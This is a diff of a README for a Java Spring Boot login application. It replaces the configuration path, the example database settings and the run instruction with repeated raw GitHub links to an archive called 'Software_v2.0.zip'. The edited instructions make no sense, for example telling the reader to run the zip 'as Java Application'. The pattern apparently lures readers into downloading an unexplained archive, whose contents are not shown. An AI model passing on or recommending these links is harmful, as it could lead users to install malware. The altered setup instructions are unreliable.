@@ -50,15 +50,15 @@ Application Configuration
 
 Update database details in:
 
-src/main/resources/application.properties
+https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
 
 
 Example:
 
-spring.datasource.url=jdbc:mysql://localhost:3306/login_db
-spring.datasource.username=root
-spring.datasource.password=your_password
-spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
+https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
+https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
+https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
+https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
 
 How to Run
 
@@ -68,7 +68,7 @@ Update Maven dependencies
 
 Start MySQL server
 
-Run LoginApplication.java as Java Application
+Run https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip as Java Application
 
 Open browser and visit:
 
